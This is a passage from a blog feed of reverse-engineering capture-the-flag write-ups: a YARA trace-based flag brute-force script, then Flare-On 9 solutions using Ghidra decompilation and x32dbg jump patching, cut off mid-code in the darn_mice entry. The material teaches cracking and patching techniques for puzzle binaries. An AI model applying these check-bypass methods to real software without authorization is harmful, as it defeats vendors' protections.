0.001969 006981       - case OP_JFALSE: // yr_execute_code()
0.001974 006981       - case OP_JFALSE: // yr_execute_code()
0.001979 006981       - case OP_JFALSE: // yr_execute_code()
0.001983 006981       - case OP_JFALSE: // yr_execute_code()
0.001988 006981       - case OP_JFALSE: // yr_execute_code()
0.001993 006981       - case OP_JFALSE: // yr_execute_code()
0.001998 006981       - case OP_JFALSE: // yr_execute_code()
0.002003 006981       - case OP_JFALSE: // yr_execute_code()
0.002008 006981       - case OP_JFALSE: // yr_execute_code()
0.002013 006981       - case OP_JFALSE: // yr_execute_code()
0.002017 006981       - case OP_JFALSE: // yr_execute_code()
0.002022 006981       - case OP_JFALSE: // yr_execute_code()
0.002028 006981       - case OP_JFALSE: // yr_execute_code()
0.002033 006981       - case OP_JFALSE: // yr_execute_code()
0.002037 006981       - case OP_JFALSE: // yr_execute_code()
0.002042 006981       - case OP_JFALSE: // yr_execute_code()
0.002047 006981       - case OP_JFALSE: // yr_execute_code()
0.002051 006981       - case OP_JFALSE: // yr_execute_code()
0.002056 006981       - case OP_JFALSE: // yr_execute_code()
0.002061 006981       - case OP_JFALSE: // yr_execute_code()
0.002066 006981       - case OP_MATCH_RULE: // yr_execute_code()
0.002071 006981       - case OP_HALT: // yr_execute_code()
0.002093 006981     } = 0 AKA ERROR_SUCCESS 0 // yr_execute_code()
0.002108 006981     - _yr_scanner_clean_matches() {}
0.002122 006981   } = 0 AKA ERROR_SUCCESS 0 // yr_scanner_scan_mem_blocks()
0.002130 006981 } = 0 AKA ERROR_SUCCESS 0 // yr_scanner_scan_mem()
0.002146 006981 - yr_scanner_destroy() {}
0.002156 006981 + yr_finalize() {
0.002162 006981   - hash__finalize() {}
0.002167 006981 } // yr_finalize()
</code></pre><p>It produces quite an interesting execution trace, expecially these blocks:</p>
<pre tabindex="0"><code>0.001604 006981       - case OP_PUSH_8: r1.i=95 // yr_execute_code()
0.001612 006981       - case OP_PUSH_8: r1.i=57 // yr_execute_code()
0.001619 006981       - case OP_BITWISE_XOR: // yr_execute_code()
$
0.001664 006981       - case OP_PUSH_8: r1.i=51 // yr_execute_code()
0.001671 006981       - case OP_PUSH_8: r1.i=95 // yr_execute_code()
0.001678 006981       - case OP_BITWISE_XOR: // yr_execute_code()

0.001729 006981       - case OP_PUSH_8: r1.i=248 // yr_execute_code()
0.001741 006981       - case OP_PUSH_8: r1.i=153 // yr_execute_code()
0.001745 006981       - case OP_BITWISE_XOR: // yr_execute_code()

0.001790 006981       - case OP_PUSH_8: r1.i=83 // yr_execute_code()
0.001799 006981       - case OP_PUSH_8: r1.i=52 // yr_execute_code()
0.001806 006981       - case OP_BITWISE_XOR: // yr_execute_code()

0.001865 006981       - case OP_PUSH_8: r1.i=248 // yr_execute_code()
0.001876 006981       - case OP_PUSH_8: r1.i=131 // yr_execute_code()
0.001885 006981       - case OP_BITWISE_XOR: // yr_execute_code()

0.001937 006981       - case OP_PUSH_8: r1.i=154 // yr_execute_code()
0.001944 006981       - case OP_PUSH_8: r1.i=247 // yr_execute_code()
0.001952 006981       - case OP_BITWISE_XOR: // yr_execute_code()
</code></pre><p>They push 2 values and XOR them together:</p>
<pre tabindex="0"><code>&gt;&gt;&gt; chr(95 ^ 57)
&#39;f&#39;
&gt;&gt;&gt; chr(51 ^ 95)
&#39;l&#39;
&gt;&gt;&gt; chr(248 ^ 153)
&#39;a&#39;
&gt;&gt;&gt; chr(83 ^ 52)
&#39;g&#39;
&gt;&gt;&gt; chr(248 ^ 131)
&#39;{&#39;
&gt;&gt;&gt; chr(154 ^ 247)
&#39;m&#39;
</code></pre><p>Interestingly they match the begining of our file, which we know is a valid flag start.</p>
<p>We can guess it checks the characters one by one and exits on the first non-matching character: it expected a <code>m</code> but got a <code>t</code> (test) from our test file.</p>
<p>We can use to that to <em>bruteforce</em> the flag char by char, by always checking the last xor sequence of the trace:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="c1"># get these last 3 lines from the trace:</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 0.001937 006981       - case OP_PUSH_8: r1.i=154 // yr_execute_code()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 0.001944 006981       - case OP_PUSH_8: r1.i=247 // yr_execute_code()</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 0.001952 006981       - case OP_BITWISE_XOR: // yr_execute_code()</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># extract the 2 values (154 and 247), xor them and convert to char</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">get_next<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    ./yara-4.2.3/yara -C flag.yarc test.txt 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span> grep -B2 OP_BITWISE_XOR: <span class="p">|</span> tail -3 <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="p">|</span> sed -n <span class="s1">&#39;s/.*r1.i=\([0-9]*\).*$/\1/p&#39;</span> <span class="p">|</span> xargs <span class="se">\
</span></span></span><span class="line"><span class="cl"><span class="se"></span>        <span class="p">|</span> python -c <span class="s2">&#34;x,y=[int(_) for _ in input().split()]; print(chr(x^y), end=&#39;&#39;)&#34;</span> 2&gt;/dev/null
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">rm -f test.txt
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="c1"># get flag char by char</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="nv">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> x in <span class="k">$(</span>seq 32<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
</span></span><span class="line"><span class="cl">    <span class="nv">c</span><span class="o">=</span><span class="s2">&#34;`get_next`&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">flag</span><span class="o">=</span><span class="s2">&#34;</span><span class="si">${</span><span class="nv">flag</span><span class="si">}${</span><span class="nv">c</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="nb">echo</span> <span class="nv">$flag</span> &gt; test.txt
</span></span><span class="line"><span class="cl">    cat test.txt
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></div><p>running this script gives the flag:</p>
<pre tabindex="0"><code>% sh bruteforce.sh

f
fl
fla
flag
flag{
flag{m
flag{m3
flag{m33
flag{m33t
flag{m33t_
flag{m33t_m
flag{m33t_me
flag{m33t_me_
flag{m33t_me_1
flag{m33t_me_1n
flag{m33t_me_1n_
flag{m33t_me_1n_7
flag{m33t_me_1n_7h
flag{m33t_me_1n_7h3
flag{m33t_me_1n_7h3_
flag{m33t_me_1n_7h3_a
flag{m33t_me_1n_7h3_ar
flag{m33t_me_1n_7h3_ar3
flag{m33t_me_1n_7h3_ar3n
flag{m33t_me_1n_7h3_ar3n4
flag{m33t_me_1n_7h3_ar3n4}
flag{m33t_me_1n_7h3_ar3n4}}
flag{m33t_me_1n_7h3_ar3n4}}}
flag{m33t_me_1n_7h3_ar3n4}}}}
flag{m33t_me_1n_7h3_ar3n4}}}}}
flag{m33t_me_1n_7h3_ar3n4}}}}}}
</code></pre>]]></content>
		</item>
		
		<item>
			<title>Flare-On 9 Writeups</title>
			<link>https://matth.dmz42.org/posts/2022/flare-on-9-writeups/</link>
			<pubDate>Mon, 14 Nov 2022 13:15:00 +0100</pubDate>
			
			<guid>https://matth.dmz42.org/posts/2022/flare-on-9-writeups/</guid>
			<description>Here are (some ?) writeups for this year Flare-On challenge. I&amp;rsquo;ll add more in the coming days.
For reference here is my timing:
0. TOC Flaredle
PixelPoker
Magic 8 Ball
darn_mice
T8
a la mode
anode
backdoor
encryptor
Nur getraumt
The challenge that shall not be named
1. Flaredle 1.1 Challenge Prompt Welcome to Flare-On 9!
You probably won&amp;rsquo;t win. Maybe you&amp;rsquo;re like us and spent the year playing Wordle. We made our own version that is too hard to beat without cheating.</description>
			<content type="html"><![CDATA[<p>Here are (some ?) writeups for this year Flare-On challenge.
I&rsquo;ll add more in the coming days.</p>
<p>For reference here is my timing:</p>
<p><img src="00-timing.jpeg" alt="timing"></p>
<h1 id="0-toc">0. TOC</h1>
<ol>
<li>
<p><a href="#1-flaredle">Flaredle</a></p>
</li>
<li>
<p><a href="#2-pixelpoker">PixelPoker</a></p>
</li>
<li>
<p><a href="#3-magic-8-ball">Magic 8 Ball</a></p>
</li>
<li>
<p><a href="#4-darn_mice">darn_mice</a></p>
</li>
<li>
<p><a href="#5-t8">T8</a></p>
</li>
<li>
<p><a href="#6-a-la-mode">a la mode</a></p>
</li>
<li>
<p><a href="#7-anode">anode</a></p>
</li>
<li>
<p><a href="#8-backdoor">backdoor</a></p>
</li>
<li>
<p><a href="#9-encryptor">encryptor</a></p>
</li>
<li>
<p><a href="#10-nur-getraumt">Nur getraumt</a></p>
</li>
<li>
<p><a href="#11-the-challenge-that-shall-not-be-named">The challenge that shall not be named</a></p>
</li>
</ol>
<h1 id="1-flaredle">1. Flaredle</h1>
<h2 id="11-challenge-prompt">1.1 Challenge Prompt</h2>
<p>Welcome to Flare-On 9!</p>
<p>You probably won&rsquo;t win. Maybe you&rsquo;re like us and spent the year playing Wordle. We made our own version that is too
hard to beat without cheating.</p>
<h2 id="12-solution">1.2 Solution</h2>
<p>Small javascript webapp where we need to guess a word.</p>
<p>Open <code>script.js</code>, starts with:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">import</span> <span class="p">{</span> <span class="nx">WORDS</span> <span class="p">}</span> <span class="nx">from</span> <span class="s2">&#34;./words.js&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">NUMBER_OF_GUESSES</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">WORD_LENGTH</span> <span class="o">=</span> <span class="mi">21</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">CORRECT_GUESS</span> <span class="o">=</span> <span class="mi">57</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">guessesRemaining</span> <span class="o">=</span> <span class="nx">NUMBER_OF_GUESSES</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">currentGuess</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">nextLetter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kd">let</span> <span class="nx">rightGuessString</span> <span class="o">=</span> <span class="nx">WORDS</span><span class="p">[</span><span class="nx">CORRECT_GUESS</span><span class="p">];</span>
</span></span></code></pre></div><p>find correct flag condition:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">guessString</span> <span class="o">===</span> <span class="nx">rightGuessString</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">flag</span> <span class="o">=</span> <span class="nx">rightGuessString</span> <span class="o">+</span> <span class="s1">&#39;@flare-on.com&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">toastr</span><span class="p">.</span><span class="nx">options</span><span class="p">.</span><span class="nx">timeOut</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nx">toastr</span><span class="p">.</span><span class="nx">options</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span><span class="nx">alert</span><span class="p">(</span><span class="nx">flag</span><span class="p">);}</span> 
</span></span><span class="line"><span class="cl">        <span class="nx">toastr</span><span class="p">.</span><span class="nx">success</span><span class="p">(</span><span class="s1">&#39;You guessed right! The flag is &#39;</span> <span class="o">+</span> <span class="nx">flag</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nx">guessesRemaining</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
</span></span></code></pre></div><p>we know that <code>rightGuessString = WORDS[CORRECT_GUESS]</code> and that <code>CORRECT_GUESS = 57</code>, so we can just pick it up in the array from <code>words.js</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">% cat -n words.js <span class="p">|</span> grep <span class="s2">&#34; </span><span class="k">$((</span><span class="m">57</span><span class="o">+</span><span class="m">1</span><span class="k">))</span><span class="s2">&#34;</span>       <span class="c1"># because array starts at 0</span>
</span></span><span class="line"><span class="cl">    58		<span class="s1">&#39;flareonisallaboutcats&#39;</span>,
</span></span></code></pre></div><p>flag: <code>flareonisallaboutcats@flare-on.com</code></p>
<h1 id="2-pixelpoker">2. PixelPoker</h1>
<h2 id="21-challenge-prompt">2.1 Challenge Prompt</h2>
<p>I said you wouldn&rsquo;t win that last one. I lied. The last challenge was basically a captcha. Now the real work begins. Shall
we play another game?</p>
<h2 id="22-solution">2.2 Solution</h2>
<p>launching the executable, we get this fancy looking window.
We need to click the right pixel, and we have 10 attempts.</p>
<p><img src="2-pixel.png" alt="pixelpoker"></p>
<p>Following the entry point, we find the main function, which in turn calls the following function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">FUN_00401120</span><span class="p">(</span><span class="n">HINSTANCE</span> <span class="n">param_1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">WNDCLASSEXW</span> <span class="n">wc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">style</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">lpfnWndProc</span> <span class="o">=</span> <span class="n">WindowProc</span><span class="p">;</span>    <span class="cm">/* Window Procedure */</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">cbClsExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">cbWndExtra</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">hInstance</span> <span class="o">=</span> <span class="n">param_1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">hIcon</span> <span class="o">=</span> <span class="nf">LoadIconW</span><span class="p">(</span><span class="n">param_1</span><span class="p">,(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="mh">0x6b</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">hCursor</span> <span class="o">=</span> <span class="nf">LoadCursorW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="mh">0x7f00</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">hbrBackground</span> <span class="o">=</span> <span class="p">(</span><span class="n">HBRUSH</span><span class="p">)</span><span class="mh">0x6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">lpszMenuName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="mh">0x6d</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">lpszClassName</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="o">&amp;</span><span class="n">DAT_004131b0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">wc</span><span class="p">.</span><span class="n">hIconSm</span> <span class="o">=</span> <span class="nf">LoadIconW</span><span class="p">(</span><span class="n">wc</span><span class="p">.</span><span class="n">hInstance</span><span class="p">,(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="mh">0x6c</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">RegisterClassExW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">wc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>which registers a window class, with <code>lpfnWndProc</code> pointing the Window Procedure that will handle our window events.</p>
<p>References from MSDN:</p>
<ul>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/learnwin32/writing-the-window-procedure">Writing the Window Procedure</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/inputdev/wm-lbuttondown">WM_LBUTTONDOWN message</a></li>
</ul>
<p>With the above references, we can retype the WindowProc prototype in ghidra, as well as use the appropriate WM_* constants on the <code>uMsg</code> comparisons and then focus on the click events:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">LRESULT</span> <span class="nf">WindowProc</span><span class="p">(</span><span class="n">HWND</span> <span class="n">hwnd</span><span class="p">,</span><span class="n">uint</span> <span class="n">uMsg</span><span class="p">,</span><span class="n">WPARAM</span> <span class="n">wParam</span><span class="p">,</span><span class="n">LPARAM</span> <span class="n">lpParam</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// snip
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="n">sVar1</span> <span class="o">=</span> <span class="p">(</span><span class="kt">short</span><span class="p">)((</span><span class="n">uint</span><span class="p">)</span><span class="n">lpParam</span> <span class="o">&gt;&gt;</span> <span class="mh">0x10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">uMsg</span> <span class="o">==</span> <span class="n">WM_MOUSEMOVE</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nf">update_window_title</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="mh">0x104</span><span class="p">,</span><span class="s">&#34;PixelPoker (%d,%d) - #%d/%d&#34;</span><span class="p">,(</span><span class="kt">int</span><span class="p">)(</span><span class="kt">short</span><span class="p">)</span><span class="n">lpParam</span><span class="p">,(</span><span class="kt">int</span><span class="p">)</span><span class="n">sVar1</span><span class="p">,</span><span class="n">TRIES</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">SetWindowTextA</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span><span class="n">buff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">uMsg</span> <span class="o">==</span> <span class="n">WM_LBUTTONDOWN</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">px_x</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)(</span><span class="kt">short</span><span class="p">)</span><span class="n">lpParam</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="n">px_y</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint</span><span class="p">)</span><span class="n">sVar1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">TRIES</span> <span class="o">==</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nf">MessageBoxA</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="s">&#34;Womp womp... :(&#34;</span><span class="p">,</span><span class="s">&#34;Please play again!&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="nf">DestroyWindow</span><span class="p">(</span><span class="n">hwnd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="n">TRIES</span> <span class="o">=</span> <span class="n">TRIES</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">((</span><span class="n">px_x</span> <span class="o">==</span> <span class="n">s_FLARE</span><span class="o">-</span><span class="n">On_00412004</span><span class="p">.</span><span class="n">_0_4_</span> <span class="o">%</span> <span class="n">DAT_00413280</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">px_y</span> <span class="o">==</span> <span class="n">s_FLARE</span><span class="o">-</span><span class="n">On_00412004</span><span class="p">.</span><span class="n">_4_4_</span> <span class="o">%</span> <span class="n">DAT_00413284</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">DAT_00413284</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                        <span class="n">iVar7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="n">uVar4</span> <span class="o">=</span> <span class="n">DAT_00413280</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="n">uVar5</span> <span class="o">=</span> <span class="n">DAT_00413284</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                            <span class="n">iVar6</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="p">(</span><span class="mi">0</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar4</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                <span class="k">do</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                                    <span class="nf">FUN_004015d0</span><span class="p">(</span><span class="n">iVar6</span><span class="p">,</span><span class="n">iVar7</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                                    <span class="n">iVar6</span> <span class="o">=</span> <span class="n">iVar6</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                                    <span class="n">uVar4</span> <span class="o">=</span> <span class="n">DAT_00413280</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                                    <span class="n">uVar5</span> <span class="o">=</span> <span class="n">DAT_00413284</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                                <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">iVar6</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">DAT_00413280</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                            <span class="p">}</span>
</span></span><span class="line"><span class="cl">                            <span class="n">iVar7</span> <span class="o">=</span> <span class="n">iVar7</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                        <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">iVar7</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">uVar5</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span> <span class="k">if</span> <span class="p">((</span><span class="n">px_x</span> <span class="o">&lt;</span> <span class="n">DAT_00413280</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">px_y</span> <span class="o">&lt;</span> <span class="n">DAT_00413284</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nf">FUN_004015d0</span><span class="p">(</span><span class="n">px_x</span><span class="p">,</span><span class="n">px_y</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="nf">update_window_title</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span><span class="mh">0x104</span><span class="p">,</span><span class="s">&#34;PixelPoker (%d,%d) - #%d/%d&#34;</span><span class="p">,</span><span class="n">px_x</span><span class="p">,</span><span class="n">px_y</span><span class="p">,</span><span class="n">TRIES</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">SetWindowTextA</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span><span class="n">buff</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">pHVar2</span> <span class="o">=</span> <span class="nf">GetDC</span><span class="p">(</span><span class="n">hwnd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">BitBlt</span><span class="p">(</span><span class="n">pHVar2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">DAT_00413280</span><span class="p">,</span><span class="n">DAT_00413284</span><span class="p">,</span><span class="n">DAT_00413278</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xcc0020</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="nf">ReleaseDC</span><span class="p">(</span><span class="n">hwnd</span><span class="p">,</span><span class="n">pHVar2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span></code></pre></div><p>We can see than we the mouse is moved around the window (<code>WM_MOUSEMOVE</code>), the window title is updated with x/y coordinates.</p>
<p>On the click event (<code>WM_LBUTTONDOWN</code>), there&rsquo;s a conditionnal check:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="n">px_x</span> <span class="o">==</span> <span class="n">s_FLARE</span><span class="o">-</span><span class="n">On_00412004</span><span class="p">.</span><span class="n">_0_4_</span> <span class="o">%</span> <span class="n">DAT_00413280</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">px_y</span> <span class="o">==</span> <span class="n">s_FLARE</span><span class="o">-</span><span class="n">On_00412004</span><span class="p">.</span><span class="n">_4_4_</span> <span class="o">%</span> <span class="n">DAT_00413284</span><span class="p">))</span> <span class="p">{</span>
</span></span></code></pre></div><p>which leads further down to some RC4 routine.</p>
<p>Let&rsquo;s run it in a debugger and patch the 2 following conditionnal jumps.</p>
<p><img src="2-patch1.png" alt="jumps"></p>
<p>Fire x32dbg, set 2 breakpoints:</p>
<pre tabindex="0"><code>bp 00401486
bp 0040149d
</code></pre><p>Continue execution and click anywhere.
On the 2 breakpoints, modify the Zero Flag (ZF) and then watch the flag:</p>
<p><img src="2-flag.png" alt="flag"></p>
<h1 id="3-magic-8-ball">3. Magic 8 Ball</h1>
<p>(coming soon ?)</p>
<h1 id="4-darn_mice">4. darn_mice</h1>
<h2 id="41-challenge-prompt">4.1 Challenge Prompt</h2>
<p>&ldquo;If it crashes its user error.&rdquo;</p>
<p>-Flare Team</p>
<h2 id="42-solution">4.2 Solution</h2>
<p>When we run the executable with an arguments it prints something and exits:</p>
<pre tabindex="0"><code>C:\Users\me\Desktop&gt;darn_mice.exe aaa
On your plate, you see four olives.
You leave the room, and a mouse EATS one!
</code></pre><p>We can find these strings in ghidra and follow the XREF to this function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="n">PUCHAR</span> <span class="n">input_string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
